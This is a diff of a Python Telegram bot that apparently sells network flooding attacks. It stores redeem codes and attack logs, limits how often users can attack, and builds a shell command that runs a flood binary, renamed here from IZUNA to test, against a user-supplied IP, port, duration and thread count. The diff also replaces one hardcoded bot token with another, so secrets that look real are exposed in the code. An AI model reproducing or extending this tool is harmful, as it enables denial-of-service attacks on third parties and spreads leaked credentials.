@@ -19,8 +19,8 @@ settings_collection = db['settings-V9']
 redeem_codes_collection = db['redeem_codes']
 attack_logs_collection = db['user_attack_logs']
 
-TELEGRAM_BOT_TOKEN = '8119765146:AAEXyY4_KBcf-WG1zu2gSwVt_vT0WKe8xn4'
-ADMIN_USER_ID = 1216702307 
+TELEGRAM_BOT_TOKEN = '7110991582:AAHWArUkUAtPpWykh74Y85g-Tyx4M6iUllE'
+ADMIN_USER_ID =  5142603617
 COOLDOWN_PERIOD = timedelta(minutes=1) 
 user_last_attack_time = {} 
 user_attack_history = {}
@@ -600,11 +600,11 @@ async def attack(update: Update, context: CallbackContext):
     threads = threads["value"] if threads else DEFAULT_THREADS
 
     if argument_type == 3:
-        attack_command = f"./IZUNA {ip} {port} {duration}"
+        attack_command = f"./test {ip} {port} {duration}"
     elif argument_type == 4:
-        attack_command = f"./IZUNA {ip} {port} {duration} {threads}"
+        attack_command = f"./test {ip} {port} {duration} {threads}"
     elif argument_type == 5:
-        attack_command = f"./IZUNA {ip} {port} {duration} {byte_size} {threads}"
+        attack_command = f"./test {ip} {port} {duration} {byte_size} {threads}"
 
     await context.bot.send_message(chat_id=chat_id, text=( 
         f"*⚔️ Attack Launched! ⚔️*\n"
